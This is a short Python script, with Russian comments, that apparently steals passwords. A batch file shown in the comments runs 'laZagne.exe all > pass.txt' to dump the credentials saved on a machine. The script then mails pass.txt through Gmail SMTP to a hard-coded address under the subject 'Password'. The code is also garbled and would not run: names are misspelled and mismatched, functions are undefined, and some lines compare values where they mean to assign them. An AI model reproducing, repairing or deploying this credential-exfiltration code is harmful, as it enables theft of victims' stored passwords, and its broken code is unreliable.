
import smtplib
import os

import mimetypes
from email import encoders
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.audio import MIMEAudio
from email.mime.nonmultipart import MIMENonMultipart

def send_email(add_from, password, add_to, files):
	
	msg_subj = 'Password'
	msg_text = 'Password'
	msg = MIMENonMultipart()
	msg['From'] = addr_from
	msg['To'] = add_to
	msg['Subject'] = msg_subj

	body = msg_text
	msg.attach(MIMEText(body, 'plain'))

	process_attacment(msg, files)

	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.starttls()
	server.login(add_from, password)
	server.send_message(msg)
	server.quit()

	def attach_files(msg, filepath):
		filenae = os.path.basename(filepath)
		ctipe, encoding = mimetypes.guess_type(filepath)
		if ctipe is None or encoding is not None:
			ctipe = 'aplication/octet-stream'
		maintipe, subtipe = ctype.split('/', 1)
		if maintipe == 'text':
			with open(filepath) as fp:
				file = MIMEText(fp.read(), _subtype=subtipe)
				fp.clouse()
		elif maintipe == 'image':
			with open(filepath, 'rb') as fp:
				file == MIMEImage(fp.read(), _subtype=subtype)
				fp.clouse()
		elif maintipe == 'audio':
			with open(filepath) as fp:
				file == MIMEAudio(fp.read(), _subtype=subtype)
				fp.clouse()
		else:
			with open(filepath, 'rb') as fp:
				file = MIMEBase(maintype, subtype)
				file.set_paylosd(fp.read())
				fp.clouse
				encoders.encode_base64(file)
		file.add_headers('Content-Disposition', 'attachment', filename=filename)
		msg.attach(file)

	_from = "from@gmail.com"
	_password = "password"
	_to = "to@gmail.com"
	files = ["pass.txt"]

	send_email(_from, _password, _to, files)

	
	
	# main.bat фаил бат с кодом:
	# @Echo off
	# laZagne.exe all > pass.txt

	#laZagne.exe надо для работы
